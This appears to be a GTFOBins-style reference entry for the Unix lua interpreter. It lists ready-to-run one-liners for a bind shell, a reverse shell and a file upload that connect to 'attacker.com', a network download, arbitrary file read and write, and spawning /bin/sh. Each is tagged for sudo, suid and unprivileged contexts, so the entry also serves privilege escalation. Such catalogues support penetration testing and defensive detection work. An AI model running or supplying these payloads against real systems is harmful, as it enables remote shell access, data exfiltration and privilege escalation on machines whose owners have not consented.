---
type: gtfobin
name: lua
platform: Unix
functions: [bind-shell, download, file-read, file-write, reverse-shell, shell, upload]
tags: [gtfobin, unix, lotl]
---

# lua

## bind-shell

```bash
lua -e '
  local k=require("socket");
  local s=assert(k.bind("*",12345));
  local c=s:accept();
  while true do
    local r,x=c:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));c:send(b);
  end;c:close();f:close();'
```
_This requires `lua-socket` to be available._
**Contexts:** sudo, suid, unprivileged

## download

```bash
lua -e '
  local k=require("socket");
  local s=assert(k.bind("*",12345));
  local c=s:accept();
  local d,x=c:receive("*a");
  c:close();
  local f=io.open("/path/to/output-file", "wb");
  f:write(d);
  io.close(f);'
```
_This requires `lua-socket` to be available._
**Contexts:** sudo, suid, unprivileged

## file-read

```bash
lua -e 'local f=io.open("/path/to/input-file", "rb"); io.write(f:read("*a")); io.close(f);'
```
**Contexts:** sudo, suid, unprivileged

## file-write

```bash
lua -e 'local f=io.open("/path/to/output-file", "wb"); f:write("DATA"); io.close(f);'
```
**Contexts:** sudo, suid, unprivileged

## reverse-shell

```bash
lua -e '
  local s=require("socket");
  local t=assert(s.tcp());
  t:connect("attacker.com",12345);
  while true do
    local r,x=t:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));t:send(b);
  end;
  f:close();t:close();'
```
_This requires `lua-socket` to be available._
**Contexts:** sudo, suid, unprivileged

## shell

```bash
lua -e 'os.execute("/bin/sh")'
```
**Contexts:** sudo, suid, unprivileged

## upload

```bash
lua -e '
  local f=io.open("/path/to/input-file", "rb")
  local d=f:read("*a")
  io.close(f);
  local s=require("socket");
  local t=assert(s.tcp());
  t:connect("attacker.com",12345);
  t:send(d);
  t:close();'
```
_This requires `lua-socket` to be available._
**Contexts:** sudo, suid, unprivileged
